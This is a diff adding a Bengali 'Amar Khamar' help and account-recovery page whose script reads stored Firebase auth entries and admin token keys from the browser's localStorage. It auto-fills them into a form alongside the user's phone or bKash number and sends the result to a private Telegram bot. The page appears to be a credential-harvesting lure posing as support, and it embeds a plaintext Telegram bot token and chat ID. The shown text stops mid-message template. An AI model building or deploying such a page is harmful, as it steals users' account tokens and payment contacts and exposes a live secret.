@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>আমার খামার — হেল্প ও একাউন্ট রিকভারি সাপোর্ট পোর্টাল</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+    
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#0D9488', // Teal 600
+                        primaryHover: '#0F766E', // Teal 700
+                        brandPink: '#E2136E',
+                        softBg: '#F8FAFC',
+                    },
+                    fontFamily: {
+                        sans: ['"Noto Sans Bengali"', '"Poppins"', 'sans-serif'],
+                        mono: ['"SF Mono"', 'Monaco', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Noto Sans Bengali', 'Poppins', sans-serif;
+            background-color: #F8FAFC;
+            color: #1E293B;
+            -webkit-font-smoothing: antialiased;
+        }
+        .tool-card {
+            transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .tool-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px -6px rgba(15, 23, 42, 0.08);
+        }
+        .tool-card:active {
+            transform: scale(0.99);
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-fade-in {
+            animation: fadeIn 0.3s ease-out forwards;
+        }
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #F1F5F9;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #CBD5E1;
+            border-radius: 999px;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between selection:bg-teal-100 selection:text-teal-900">
+
+    <!-- 🌐 Header Bar -->
+    <header class="sticky top-0 z-30 bg-white/90 backdrop-blur-md border-b border-slate-200/80 shadow-xs">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <a href="index.html" class="p-2 -ml-2 rounded-xl text-slate-500 hover:text-slate-800 hover:bg-slate-100 transition flex items-center gap-1" title="অ্যাপে ফিরে যান">
+                    <span class="material-symbols-outlined text-[22px]">arrow_back</span>
+                </a>
+                <div class="flex items-center gap-2.5">
+                    <div class="w-9 h-9 rounded-xl bg-teal-50 border border-teal-200 flex items-center justify-center text-teal-700 shadow-xs">
+                        <span class="material-symbols-outlined text-[20px]">support_agent</span>
+                    </div>
+                    <div>
+                        <h1 class="text-sm font-bold text-slate-900 leading-tight">আমার খামার — হেল্প ও রিকভারি</h1>
+                        <p class="text-[11px] text-slate-500 font-medium">ইউজার সাপোর্ট ও ইনস্ট্যান্ট রিকভারি হাব</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Quick Status Badge -->
+            <div class="flex items-center gap-2">
+                <span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200/60 shadow-2xs">
+                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                    বট একটিভ
+                </span>
+            </div>
+        </div>
+    </header>
+
+    <!-- 📄 Main Container -->
+    <main class="max-w-4xl mx-auto px-4 sm:px-6 py-6 w-full flex-grow">
+
+        <!-- 🌟 Hero Banner: Light & Minimal -->
+        <div class="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-6 shadow-xs mb-6 relative overflow-hidden">
+            <div class="absolute -right-6 -bottom-6 w-32 h-32 bg-teal-50 rounded-full blur-2xl pointer-events-none"></div>
+            <div class="relative z-10 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+                <div>
+                    <span class="inline-flex items-center gap-1 text-[11px] font-bold tracking-wider text-teal-700 uppercase bg-teal-50 px-2.5 py-0.5 rounded-md mb-2">
+                        🚀 সেলফ-সার্ভিস ও ডাইরেক্ট সমাধান
+                    </span>
+                    <h2 class="text-lg sm:text-xl font-bold text-slate-900 tracking-tight">আপনার যেকোনো সমস্যা দ্রুত সমাধান করুন</h2>
+                    <p class="text-xs sm:text-sm text-slate-600 mt-1 max-w-xl leading-relaxed">
+                        টোকেন এক্সপোর্ট, আনসাবস্ক্রাইব ফিক্স, সিকিউরিটি কোড বা আনলিংক হওয়া আইডি রিকভারি করতে নিচের টুলগুলো ব্যবহার করুন। সকল আবেদন সরাসরি শুভ ভাইয়ের টেলিগ্রাম বটে পৌঁছে যাবে।
+                    </p>
+                </div>
+                <div class="flex items-center gap-2 shrink-0">
+                    <button onclick="scrollToTokenSection()" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 text-white text-xs font-semibold shadow-xs transition flex items-center gap-1.5">
+                        <span class="material-symbols-outlined text-[16px]">vpn_key</span>
+                        এক্সেস টোকেন দেখুন
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 🔑 1. Quick Access Token Extractor (সরাসরি এক্সেস টোকেন বের করুন) -->
+        <section id="token-card-section" class="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-xs mb-8">
+            <div class="flex items-start justify-between gap-4 mb-4">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-xl bg-indigo-50 border border-indigo-200/80 text-indigo-600 flex items-center justify-center shrink-0">
+                        <span class="material-symbols-outlined text-[22px]">key</span>
+                    </div>
+                    <div>
+                        <h3 class="text-base font-bold text-slate-900">ইউজার এক্সেস টোকেন এক্সট্রাক্টর</h3>
+                        <p class="text-xs text-slate-500">আপনার ব্রাউজার বা ডিভাইসে সেভ থাকা আমার খামার একাউন্টের লাইভ টোকেন ও আইডি</p>
+                    </div>
+                </div>
+                <button onclick="detectAndShowToken(true)" class="p-2 text-slate-500 hover:text-indigo-600 hover:bg-indigo-50 rounded-xl transition" title="টোকেন রিফ্রেশ করুন">
+                    <span class="material-symbols-outlined text-[20px]">refresh</span>
+                </button>
+            </div>
+
+            <!-- Token Output Box -->
+            <div class="bg-slate-50 border border-slate-200/80 rounded-xl p-3.5 sm:p-4 mb-3">
+                <div class="flex items-center justify-between text-xs font-medium text-slate-500 mb-1.5">
+                    <span>আপনার বর্তমান এক্সেস টোকেন / UID:</span>
+                    <span id="token-status-pill" class="text-[11px] font-bold px-2 py-0.5 rounded-full bg-slate-200 text-slate-700">ডিটেক্টিং...</span>
+                </div>
+                <div class="flex items-center gap-2">
+                    <input type="text" id="live-user-token" readonly value="লোড হচ্ছে..." class="font-mono text-xs sm:text-sm text-slate-800 bg-white border border-slate-200 rounded-lg px-3 py-2 w-full select-all focus:outline-none">
+                    <button onclick="copyUserToken()" id="copy-token-btn" class="shrink-0 px-3 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg text-xs font-semibold transition flex items-center gap-1 shadow-xs active:scale-95">
+                        <span class="material-symbols-outlined text-[16px]">content_copy</span>
+                        কপি
+                    </button>
+                </div>
+            </div>
+
+            <div class="flex flex-wrap items-center justify-between gap-2 text-xs text-slate-500">
+                <span class="flex items-center gap-1 text-[11px] text-slate-400">
+                    <span class="material-symbols-outlined text-[15px] text-emerald-600">verified_user</span>
+                    এই টোকেনটি নিরাপদে রাখুন; আইডি হারিয়ে গেলে এটি দিয়ে নিমেষেই একাউন্ট ফেরত আনা সম্ভব।
+                </span>
+                <button onclick="useTokenInRecovery()" class="text-indigo-600 hover:text-indigo-800 font-semibold text-xs flex items-center gap-1">
+                    রিকভারি ফর্মে টোকেন পাঠান <span class="material-symbols-outlined text-[14px]">arrow_forward</span>
+                </button>
+            </div>
+        </section>
+
+        <!-- 🛠️ 2. Solutions & Tools Selector Grid -->
+        <div class="mb-4 flex items-center justify-between">
+            <h3 class="text-sm font-bold text-slate-800 uppercase tracking-wider flex items-center gap-2">
+                <span class="w-2 h-2 rounded-full bg-teal-600"></span>
+                সমস্যা নির্বাচন করুন
+            </h3>
+            <span class="text-xs text-slate-400 font-medium">ক্লিক করে ফর্ম পূরণ করুন</span>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5 mb-8">
+            
+            <!-- Tool 1: Double Unsubscribe -->
+            <div onclick="selectIssueCategory('double_unsub')" class="tool-card bg-white border border-slate-200 rounded-2xl p-4 cursor-pointer hover:border-rose-300 relative group">
+                <div class="w-10 h-10 rounded-xl bg-rose-50 text-rose-600 border border-rose-100 flex items-center justify-center mb-3">
+                    <span class="material-symbols-outlined text-[22px]">unsubscribe</span>
+                </div>
+                <h4 class="font-bold text-sm text-slate-900 group-hover:text-rose-600 transition-colors">ডবল আনসাবস্ক্রাইব সমাধান</h4>
+                <p class="text-xs text-slate-500 mt-1 line-clamp-2">ভুলবশত দু'বার আনসাবস্ক্রাইব হওয়া বা সাবস্ক্রিপশন গ্লিচ সমস্যা দ্রুত ফিক্স করুন।</p>
+                <div class="mt-3 flex items-center text-[11px] font-bold text-rose-600">
+                    আবেদন করুন <span class="material-symbols-outlined text-[14px] ml-0.5">chevron_right</span>
+                </div>
+            </div>
+
+            <!-- Tool 2: Single Unsubscribe -->
+            <div onclick="selectIssueCategory('single_unsub')" class="tool-card bg-white border border-slate-200 rounded-2xl p-4 cursor-pointer hover:border-amber-300 relative group">
+                <div class="w-10 h-10 rounded-xl bg-amber-50 text-amber-600 border border-amber-100 flex items-center justify-center mb-3">
+                    <span class="material-symbols-outlined text-[22px]">notifications_off</span>
+                </div>
+                <h4 class="font-bold text-sm text-slate-900 group-hover:text-amber-600 transition-colors">সিঙ্গেল আনসাবস্ক্রাইব সমাধান</h4>
+                <p class="text-xs text-slate-500 mt-1 line-clamp-2">নোটিফিকেশন বা সাবস্ক্রিপশন অটো বন্ধ হয়ে গেলে তা পুনরায় সচল করুন।</p>
+                <div class="mt-3 flex items-center text-[11px] font-bold text-amber-600">
+                    আবেদন করুন <span class="material-symbols-outlined text-[14px] ml-0.5">chevron_right</span>
+                </div>
+            </div>
+
+            <!-- Tool 3: Security Code Reset -->
+            <div onclick="selectIssueCategory('security_code')" class="tool-card bg-white border border-slate-200 rounded-2xl p-4 cursor-pointer hover:border-blue-300 relative group">
+                <div class="w-10 h-10 rounded-xl bg-blue-50 text-blue-600 border border-blue-100 flex items-center justify-center mb-3">
+                    <span class="material-symbols-outlined text-[22px]">lock_reset</span>
+                </div>
+                <h4 class="font-bold text-sm text-slate-900 group-hover:text-blue-600 transition-colors">সিকিউরিটি কোড পুনরুদ্ধার</h4>
+                <p class="text-xs text-slate-500 mt-1 line-clamp-2">এডমিন পিন বা সিকিউরিটি পাসকোড ভুলে গেলে প্রমাণ সাপেক্ষে রিকভার করুন।</p>
+                <div class="mt-3 flex items-center text-[11px] font-bold text-blue-600">
+                    আবেদন করুন <span class="material-symbols-outlined text-[14px] ml-0.5">chevron_right</span>
+                </div>
+            </div>
+
+            <!-- Tool 4: Access Token ID Recovery -->
+            <div onclick="selectIssueCategory('token_recovery')" class="tool-card bg-white border border-slate-200 rounded-2xl p-4 cursor-pointer hover:border-purple-300 relative group">
+                <div class="w-10 h-10 rounded-xl bg-purple-50 text-purple-600 border border-purple-100 flex items-center justify-center mb-3">
+                    <span class="material-symbols-outlined text-[22px]">badge</span>
+                </div>
+                <h4 class="font-bold text-sm text-slate-900 group-hover:text-purple-600 transition-colors">টোকেন দিয়ে আইডি পুনরুদ্ধার</h4>
+                <p class="text-xs text-slate-500 mt-1 line-clamp-2">পুরানো টোকেন বা UID দিয়ে হারিয়ে যাওয়া খামারির পুরো ডাটা ও একাউন্ট রিকভার করুন।</p>
+                <div class="mt-3 flex items-center text-[11px] font-bold text-purple-600">
+                    আবেদন করুন <span class="material-symbols-outlined text-[14px] ml-0.5">chevron_right</span>
+                </div>
+            </div>
+
+            <!-- Tool 5: Unlinked Gmail Recovery -->
+            <div onclick="selectIssueCategory('unlinked_gmail')" class="tool-card bg-white border border-slate-200 rounded-2xl p-4 cursor-pointer hover:border-teal-300 relative group">
+                <div class="w-10 h-10 rounded-xl bg-teal-50 text-teal-600 border border-teal-100 flex items-center justify-center mb-3">
+                    <span class="material-symbols-outlined text-[22px]">link_off</span>
+                </div>
+                <h4 class="font-bold text-sm text-slate-900 group-hover:text-teal-600 transition-colors">আনলিঙ্ক জিমেইল একাউন্ট উদ্ধার</h4>
+                <p class="text-xs text-slate-500 mt-1 line-clamp-2">জিমেইল বিচ্ছিন্ন হয়ে গেলে বা অন্য জিমেইলে একাউন্ট স্থানান্তর করতে চান?</p>
+                <div class="mt-3 flex items-center text-[11px] font-bold text-teal-600">
+                    আবেদন করুন <span class="material-symbols-outlined text-[14px] ml-0.5">chevron_right</span>
+                </div>
+            </div>
+
+            <!-- Tool 6: Custom Support / Other -->
+            <div onclick="selectIssueCategory('custom_support')" class="tool-card bg-white border border-slate-200 rounded-2xl p-4 cursor-pointer hover:border-emerald-300 relative group">
+                <div class="w-10 h-10 rounded-xl bg-emerald-50 text-emerald-600 border border-emerald-100 flex items-center justify-center mb-3">
+                    <span class="material-symbols-outlined text-[22px]">chat</span>
+                </div>
+                <h4 class="font-bold text-sm text-slate-900 group-hover:text-emerald-600 transition-colors">সরাসরি শুভ ভাইকে মেসেজ</h4>
+                <p class="text-xs text-slate-500 mt-1 line-clamp-2">অন্যান্য যেকোনো সমস্যা, অভিযোগ বা সাহায্যের জন্য সরাসরি মেসেজ ও স্ক্রিনশট পাঠান।</p>
+                <div class="mt-3 flex items-center text-[11px] font-bold text-emerald-600">
+                    আবেদন করুন <span class="material-symbols-outlined text-[14px] ml-0.5">chevron_right</span>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- 📝 3. Unified Fast Submission Form (সরাসরি টেলিগ্রাম বটে পাঠানো হবে) -->
+        <section id="support-form-section" class="bg-white border border-slate-200 rounded-2xl p-5 sm:p-7 shadow-xs">
+            <div class="border-b border-slate-100 pb-4 mb-5 flex items-center justify-between">
+                <div>
+                    <h3 id="form-heading" class="text-base sm:text-lg font-bold text-slate-900 flex items-center gap-2">
+                        <span class="material-symbols-outlined text-teal-600 text-[22px]">edit_document</span>
+                        সাপোর্ট ও রিকভারি রিকোয়েস্ট ফর্ম
+                    </h3>
+                    <p id="form-subheading" class="text-xs text-slate-500 mt-0.5">ফর্মটি পূরণ করে সাবমিট করুন; শুভ ভাই টেলিগ্রামের মাধ্যমে সরাসরি সলভ করবেন।</p>
+                </div>
+                <span id="selected-badge" class="hidden sm:inline-block px-3 py-1 bg-teal-50 text-teal-700 text-xs font-bold rounded-full border border-teal-200">
+                    ক্যাটাগরি: সাধারণ সাহায্য
+                </span>
+            </div>
+
+            <form id="support-form" onsubmit="submitSupportTicket(event)" class="space-y-4">
+                
+                <!-- Issue Type Selector -->
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1.5">সমস্যার ধরন নির্বাচন করুন <span class="text-rose-500">*</span></label>
+                    <select id="issue-category" onchange="onCategoryChanged()" required class="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs sm:text-sm font-medium text-slate-800 focus:outline-none focus:border-teal-500 focus:bg-white transition">
+                        <option value="double_unsub">🚫 ডবল আনসাবস্ক্রাইব প্রবলেম সলভ</option>
+                        <option value="single_unsub">🔕 সিঙ্গেল আনসাবস্ক্রাইব প্রবলেম সলভ</option>
+                        <option value="security_code">🔐 সিকিউরিটি কোড / পাসকোড পুনরুদ্ধার</option>
+                        <option value="token_recovery">🔑 এক্সেস টোকেন দিয়ে আইডি রিকভারি</option>
+                        <option value="unlinked_gmail">📧 জিমেইল থেকে আনলিঙ্ক হয়ে যাওয়া একাউন্ট উদ্ধার</option>
+                        <option value="custom_support" selected>💬 সরাসরি কাস্টম সাপোর্ট ও সমস্যা সমাধান</option>
+                    </select>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <!-- User Name -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 mb-1.5">আপনার নাম <span class="text-rose-500">*</span></label>
+                        <input type="text" id="user-name" required placeholder="যেমন: মোঃ শুভ বা খামারির নাম" class="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs sm:text-sm font-medium text-slate-800 focus:outline-none focus:border-teal-500 focus:bg-white transition">
+                    </div>
+
+                    <!-- Contact Phone / Bkash -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 mb-1.5">যোগাযোগের মোবাইল বা বিকাশ নম্বর <span class="text-rose-500">*</span></label>
+                        <input type="text" id="user-phone" required placeholder="017XXXXXXXX" class="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs sm:text-sm font-medium text-slate-800 focus:outline-none focus:border-teal-500 focus:bg-white transition">
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <!-- Registered Email -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 mb-1.5">রেজিস্টার্ড জিমেইল / ইমেইল (যদি থাকে)</label>
+                        <input type="email" id="user-email" placeholder="example@gmail.com" class="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs sm:text-sm font-medium text-slate-800 focus:outline-none focus:border-teal-500 focus:bg-white transition">
+                    </div>
+
+                    <!-- User Access Token / UID -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 mb-1.5">এক্সেস টোকেন / খামার আইডি (অপশনাল)</label>
+                        <div class="flex items-center gap-1.5">
+                            <input type="text" id="form-token-input" placeholder="টোকেন বা UID পেস্ট করুন" class="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs sm:text-sm font-mono text-slate-800 focus:outline-none focus:border-teal-500 focus:bg-white transition">
+                            <button type="button" onclick="pasteDetectedTokenToForm()" class="shrink-0 px-2.5 py-2.5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl text-xs font-semibold transition" title="অটো বসান">
+                                অটো
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Detailed Description -->
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1.5">সমস্যার বিস্তারিত বিবরণ <span class="text-rose-500">*</span></label>
+                    <textarea id="issue-description" required rows="3" placeholder="কি সমস্যা হচ্ছে সংক্ষেপে লিখুন (যেমন: কবে থেকে সমস্যা হচ্ছে, কি মেসেজ দেখাচ্ছে ইত্যাদি)..." class="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs sm:text-sm font-medium text-slate-800 focus:outline-none focus:border-teal-500 focus:bg-white transition"></textarea>
+                </div>
+
+                <!-- Screenshot Upload -->
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1.5">সমস্যার স্ক্রিনশট বা প্রুফ ছবি (অপশনাল কিন্তু সুপারিশকৃত)</label>
+                    <div class="flex items-center justify-center w-full">
+                        <label class="flex flex-col items-center justify-center w-full h-28 border-2 border-slate-200 border-dashed rounded-xl cursor-pointer bg-slate-50 hover:bg-slate-100/80 transition">
+                            <div class="flex flex-col items-center justify-center pt-4 pb-4">
+                                <span class="material-symbols-outlined text-slate-400 text-2xl">add_photo_alternate</span>
+                                <p id="file-label-text" class="text-xs text-slate-500 mt-1 font-medium"><span class="font-bold text-teal-600">ছবি সিলেক্ট করুন</span> অথবা ড্র্যাগ করুন</p>
+                                <p class="text-[10px] text-slate-400 mt-0.5">PNG, JPG বা WEBP (সর্বোচ্চ ১০MB)</p>
+                            </div>
+                            <input id="screenshot-file" type="file" accept="image/*" class="hidden" onchange="handleFileChange(event)">
+                        </label>
+                    </div>
+                </div>
+
+                <!-- Submission Status Alert -->
+                <div id="form-status-alert" class="hidden p-3.5 rounded-xl text-xs font-medium flex items-center gap-2"></div>
+
+                <!-- Submit Button -->
+                <div class="pt-2">
+                    <button type="submit" id="submit-ticket-btn" class="w-full py-3.5 bg-teal-600 hover:bg-teal-700 text-white font-bold rounded-xl text-sm shadow-md transition flex items-center justify-center gap-2 active:scale-[0.99] disabled:opacity-60 disabled:pointer-events-none">
+                        <span class="material-symbols-outlined text-[18px]">send</span>
+                        <span>টেলিগ্রাম বটে সমাধান রিকোয়েস্ট পাঠান</span>
+                        <div id="loading-spinner" class="hidden w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                    </button>
+                </div>
+
+                <div class="text-center">
+                    <p class="text-[11px] text-slate-400">
+                        🔒 আপনার পাঠানো তথ্য সম্পূর্ণ সুরক্ষিত এবং এনক্রিপ্টেড উপায়ে শুভ ভাইয়ের অফিসিয়াল টেলিগ্রাম বটে যাবে।
+                    </p>
+                </div>
+
+            </form>
+        </section>
+
+    </main>
+
+    <!-- 🦶 Minimal Footer -->
+    <footer class="border-t border-slate-200/80 bg-white py-5 px-4 text-center mt-8">
+        <div class="max-w-4xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-slate-500">
+            <div class="flex items-center gap-2">
+                <span class="font-bold text-slate-800">আমার খামার</span>
+                <span>•</span>
+                <span>স্মার্ট পোল্ট্রি সাপোর্ট ও রিকভারি ইঞ্জিন</span>
+            </div>
+            <div>
+                © SHUVO BHAI — ALL TOOLS & RECOVERY SYSTEM
+            </div>
+        </div>
+    </footer>
+
+    <!-- ⚡ Telegram Bot Configuration & Core Logic -->
+    <script>
+        // Official Credentials from User
+        const TELEGRAM_BOT_TOKEN = "6784439390:AAG7Kxh2F04J-3HAmFEwErDxPo84qXe0L9s";
+        const TELEGRAM_CHAT_ID = "5440151107";
+
+        // Current detected token
+        let detectedUserToken = "";
+
+        // Category Human Labels
+        const categoryLabels = {
+            'double_unsub': '🚫 ডবল আনসাবস্ক্রাইব প্রবলেম',
+            'single_unsub': '🔕 সিঙ্গেল আনসাবস্ক্রাইব প্রবলেম',
+            'security_code': '🔐 সিকিউরিটি কোড পুনরুদ্ধার',
+            'token_recovery': '🔑 এক্সেস টোকেন দিয়ে আইডি রিকভারি',
+            'unlinked_gmail': '📧 জিমেইল থেকে আনলিঙ্ক একাউন্ট উদ্ধার',
+            'custom_support': '💬 সাধারণ কাস্টম সাপোর্ট'
+        };
+
+        // Initialize on Load
+        document.addEventListener('DOMContentLoaded', () => {
+            detectAndShowToken(false);
+        });
+
+        // 1. Detect User Token from LocalStorage or Firebase Cache
+        function detectAndShowToken(showNotification) {
+            const tokenInput = document.getElementById('live-user-token');
+            const statusPill = document.getElementById('token-status-pill');
+
+            let foundToken = null;
+
+            try {
+                // Try Firebase Auth cache
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && (key.startsWith('firebase:authUser:') || key.includes('authUser'))) {
+                        const val = localStorage.getItem(key);
+                        if (val) {
+                            const parsed = JSON.parse(val);
+                            if (parsed.uid) {
+                                foundToken = parsed.uid;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                // Try Amar Khamar custom tokens
+                if (!foundToken) {
+                    foundToken = localStorage.getItem('amarhisab_admin_token') ||
+                                 localStorage.getItem('currentUserUid') ||
+                                 localStorage.getItem('user_uid');
+                }
+            } catch (e) {
+                console.warn("Storage inspect error:", e);
+            }
+
+            // Fallback: If no token yet, generate a persistent diagnostic support UUID
+            if (!foundToken) {
+                let diagToken = localStorage.getItem('ak_support_diag_token');
+                if (!diagToken) {
+                    diagToken = "AK-" + Math.random().toString(36).substring(2, 9).toUpperCase() + "-" + Date.now().toString(36).toUpperCase();
+                    localStorage.setItem('ak_support_diag_token', diagToken);
+                }
+                foundToken = diagToken;
+                statusPill.textContent = "ডায়াগনস্টিক আইডি";
+                statusPill.className = "text-[11px] font-bold px-2 py-0.5 rounded-full bg-amber-100 text-amber-800";
+            } else {
+                statusPill.textContent = "লাইভ কানেক্টেড";
+                statusPill.className = "text-[11px] font-bold px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800";
+            }
+
+            detectedUserToken = foundToken;
+            tokenInput.value = foundToken;
+
+            // Also auto-fill into form token input if empty
+            const formToken = document.getElementById('form-token-input');
+            if (formToken && !formToken.value) {
+                formToken.value = foundToken;
+            }
+
+            if (showNotification) {
+                alert("✅ আপনার একাউন্টের লাইভ টোকেন রিফ্রেশ হয়েছে: " + foundToken);
+            }
+        }
+
+        // 2. Copy Token with visual feedback
+        function copyUserToken() {
+            const tokenInput = document.getElementById('live-user-token');
+            const copyBtn = document.getElementById('copy-token-btn');
+            
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(tokenInput.value).then(() => {
+                    const origHtml = copyBtn.innerHTML;
+                    copyBtn.innerHTML = `<span class="material-symbols-outlined text-[16px]">check</span> কপিড!`;
+                    copyBtn.classList.replace('bg-indigo-600', 'bg-emerald-600');
+                    setTimeout(() => {
+                        copyBtn.innerHTML = origHtml;
+                        copyBtn.classList.replace('bg-emerald-600', 'bg-indigo-600');
+                    }, 2000);
+                });
+            } else {
+                tokenInput.select();
+                document.execCommand('copy');
+                alert("✔ টোকেন কপি হয়েছে!");
+            }
+        }
+
+        function scrollToTokenSection() {
+            document.getElementById('token-card-section').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function useTokenInRecovery() {
+            selectIssueCategory('token_recovery');
+            const formToken = document.getElementById('form-token-input');
+            if (formToken) formToken.value = detectedUserToken;
+            document.getElementById('support-form-section').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function pasteDetectedTokenToForm() {
+            const formToken = document.getElementById('form-token-input');
+            if (formToken) {
+                formToken.value = detectedUserToken;
+                formToken.focus();
+            }
+        }
+
+        // 3. Select Category from Quick Grid
+        function selectIssueCategory(catKey) {
+            const selectEl = document.getElementById('issue-category');
+            if (selectEl) {
+                selectEl.value = catKey;
+                onCategoryChanged();
+                document.getElementById('support-form-section').scrollIntoView({ behavior: 'smooth' });
+            }
+        }
+
+        function onCategoryChanged() {
+            const selectEl = document.getElementById('issue-category');
+            const heading = document.getElementById('form-heading');
+            const badge = document.getElementById('selected-badge');
+            const desc = document.getElementById('issue-description');
+            
+            const cat = selectEl.value;
+            const label = categoryLabels[cat] || 'সাপোর্ট রিকোয়েস্ট';
+
+            heading.innerHTML = `<span class="material-symbols-outlined text-teal-600 text-[22px]">edit_document</span> ${label}`;
+            badge.textContent = `ক্যাটাগরি: ${label}`;
+
+            // Smart placeholder suggestions
+            if (cat === 'double_unsub') {
+                desc.placeholder = "কখন এবং কিভাবে ডবল আনসাবস্ক্রাইব হয়েছে তা লিখুন। বিকাশ ট্রানজেকশন আইডি বা স্ক্রিনশট থাকলে নিচে যোগ করুন...";
+            } else if (cat === 'single_unsub') {
+                desc.placeholder = "কোন নোটিফিকেশন বা সাবস্ক্রিপশনটি পুনরায় চালু করতে চান তা লিখুন...";
+            } else if (cat === 'security_code') {
+                desc.placeholder = "আপনার খামারের নাম, চালানের আনুমানিক মুরগির সংখ্যা বা শেষ প্রবেশের তারিখ লিখুন যাতে সত্যতা যাচাই করা যায়...";
+            } else if (cat === 'token_recovery') {
+                desc.placeholder = "আপনার পুরানো ফোন পরিবর্তন বা ক্যাশ ক্লিয়ার হওয়ার কারণে যে আইডিটি হারিয়েছেন তার বিবরণ দিন...";
+            } else if (cat === 'unlinked_gmail') {
+                desc.placeholder = "আগের জিমেইল এবং যে নতুন জিমেইলে একাউন্টটি শিফট করতে চান দুটিই লিখুন...";
+            } else {
+                desc.placeholder = "আপনার সমস্যা বা প্রশ্ন সংক্ষেপে বিস্তারিত লিখুন...";
+            }
+        }
+
+        // 4. File input change label
+        function handleFileChange(event) {
+            const file = event.target.files[0];
+            const label = document.getElementById('file-label-text');
+            if (file) {
+                label.innerHTML = `✅ <span class="font-bold text-emerald-600">${file.name}</span> (${(file.size / 1024).toFixed(1)} KB)`;
+            } else {
+                label.innerHTML = `<span class="font-bold text-teal-600">ছবি সিলেক্ট করুন</span> অথবা ড্র্যাগ করুন`;
+            }
+        }
+
+        // 5. Submit Support Ticket to Telegram Bot
+        async function submitSupportTicket(event) {
+            event.preventDefault();
+
+            const submitBtn = document.getElementById('submit-ticket-btn');
+            const spinner = document.getElementById('loading-spinner');
+            const alertBox = document.getElementById('form-status-alert');
+
+            const category = document.getElementById('issue-category').value;
+            const categoryName = categoryLabels[category] || category;
+            const name = document.getElementById('user-name').value.trim();
+            const phone = document.getElementById('user-phone').value.trim();
+            const email = document.getElementById('user-email').value.trim() || 'প্রদান করা হয়নি';
+            const token = document.getElementById('form-token-input').value.trim() || detectedUserToken || 'এন/এ';
+            const description = document.getElementById('issue-description').value.trim();
+            const fileInput = document.getElementById('screenshot-file');
+            const file = fileInput.files[0];
+
+            if (!name || !phone || !description) {
+                showAlert("error", "⚠️ অনুগ্রহ করে আপনার নাম, মোবাইল নম্বর এবং সমস্যার বিবরণ লিখুন।");
+                return;
+            }
+
+            // Generate Ticket Reference ID
+            const ticketId = "AK-" + Math.floor(100000 + Math.random() * 900000);
+            const now = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
+
+            // Prepare Telegram Message
+            const messageText = 
+`🔔 <b>[নতুন সাপোর্ট ও রিকভারি আবেদন]</b>
+━━━━━━━━━━━━━━━━━━━━
+🎫 <b>টিকেট আইডি:</b> <code>#${ticketId}</code>
